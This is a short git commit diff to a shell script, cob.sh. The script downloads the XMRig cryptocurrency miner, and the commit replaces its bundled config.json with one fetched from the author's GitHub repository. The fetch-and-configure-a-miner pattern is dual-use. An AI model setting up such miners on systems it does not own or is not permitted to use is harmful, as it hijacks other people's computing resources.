ea2cd930bde5989dd8ce4ed232599a18fa8785e8
qna24 <104214473+qna24@users.noreply.github.com>
2022-04-23 00:33:31 +0800

    Update cob.sh

--- cob.sh
+++ cob.sh
@@ -3,3 +3,7 @@
   wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-static-x64.tar.gz
   tar xf xmrig-6.17.0-linux-static-x64.tar.gz
   cd xmrig-6.17.0
+  ls
+  rm -r config.json
+  wget https://raw.githubusercontent.com/qna24/config/main/config.json
+  ls
